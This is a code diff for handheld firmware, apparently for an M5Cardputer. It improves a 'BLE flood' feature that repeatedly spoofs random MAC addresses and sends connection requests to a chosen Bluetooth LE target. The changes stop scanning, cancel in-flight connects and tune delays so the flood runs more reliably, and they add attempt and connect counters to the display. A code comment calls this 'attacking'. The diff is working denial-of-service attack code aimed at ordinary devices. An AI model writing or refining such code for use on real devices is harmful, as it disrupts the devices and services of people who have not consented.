@@ -18,6 +18,9 @@
 
 static volatile bool     s_flood_alive = false;
 static volatile uint32_t s_flood_count = 0;
+static volatile int      s_flood_last_rc = 0;
+static volatile uint32_t s_flood_ok = 0;
+static volatile uint32_t s_flood_ticks = 0;
 
 static int flood_cb(ble_gap_event *event, void *arg)
 {
@@ -41,21 +44,34 @@ static void set_random_mac(void)
 static void flood_task(void *arg)
 {
     (void)arg;
+    /* Kill any lingering scan — ble_gap_connect fails if anything else
+     * is actively using the scanner. */
+    NimBLEScan *scan = NimBLEDevice::getScan();
+    if (scan) scan->stop();
+
     ble_addr_t target;
     target.type = g_ble_target.is_public ? BLE_ADDR_PUBLIC : BLE_ADDR_RANDOM;
-    /* ble_addr_t.val is little-endian; g_ble_target.addr is already LE. */
     memcpy(target.val, g_ble_target.addr, 6);
 
     while (s_flood_alive) {
+        s_flood_ticks++;
+        /* Cancel any in-flight connect attempt before starting a new one. */
+        ble_gap_conn_cancel();
         set_random_mac();
         int rc = ble_gap_connect(BLE_OWN_ADDR_RANDOM, &target, 200,
                                  nullptr, flood_cb, nullptr);
+        s_flood_last_rc = rc;
         s_flood_count++;
         if (rc == 0) {
-            delay(150);
+            s_flood_ok++;
+            delay(200);
             ble_gap_conn_cancel();
+        } else {
+            /* If we're getting rc=2 (BLE_HS_EALREADY), the previous
+             * connect is still running — give it a moment. */
+            delay(60);
         }
-        delay(40);
+        delay(30);
     }
     vTaskDelete(nullptr);
 }
@@ -69,8 +85,12 @@ void feat_ble_flood(void)
     radio_switch(RADIO_BLE);
 
     s_flood_count = 0;
+    s_flood_ok    = 0;
+    s_flood_ticks = 0;
+    s_flood_last_rc = 0;
     s_flood_alive = true;
-    xTaskCreate(flood_task, "ble_flood", 4096, nullptr, 4, nullptr);
+    BaseType_t ok = xTaskCreate(flood_task, "ble_flood", 4096, nullptr, 4, nullptr);
+    if (ok != pdPASS) { ui_toast("task fail", COL_BAD, 1200); return; }
 
     ui_clear_body();
     auto &d = M5Cardputer.Display;
@@ -87,10 +107,18 @@ void feat_ble_flood(void)
     while (true) {
         if (millis() - last > 200) {
             last = millis();
-            d.fillRect(0, BODY_Y + 40, 150, 30, COL_BG);
+            d.fillRect(0, BODY_Y + 40, 150, 60, COL_BG);
             d.setTextColor(COL_GOOD, COL_BG);
             d.setCursor(4, BODY_Y + 40);
             d.printf("attempts: %lu", (unsigned long)s_flood_count);
+            d.setCursor(4, BODY_Y + 52);
+            d.printf("connects: %lu", (unsigned long)s_flood_ok);
+            d.setTextColor(s_flood_last_rc == 0 ? COL_GOOD : COL_WARN, COL_BG);
+            d.setCursor(4, BODY_Y + 64);
+            d.printf("last rc:  %d", s_flood_last_rc);
+            d.setTextColor(COL_DIM, COL_BG);
+            d.setCursor(4, BODY_Y + 76);
+            d.printf("loops:    %lu", (unsigned long)s_flood_ticks);
             ui_draw_status(radio_name(), "flood");
         }
         /* Matrix rain in right gutter while attacking. */
